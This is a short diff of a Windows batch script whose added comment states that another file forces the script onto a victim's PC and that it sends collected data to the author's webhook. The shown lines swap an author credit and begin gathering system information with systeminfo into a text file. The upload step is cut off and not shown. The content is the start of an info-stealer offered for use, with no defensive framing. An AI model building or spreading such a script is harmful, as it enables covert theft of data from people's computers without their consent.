@@ -1,5 +1,6 @@
+#Grabs data other file forces this download onto the pc and goes to my webhook
 @echo off
-echo Hello! Made by @misterofgames_yt.
+echo Hello! Made by Shane.
 :: Collect detailed system information
 echo System Information > sysinfo.txt
 systeminfo >> sysinfo.txt
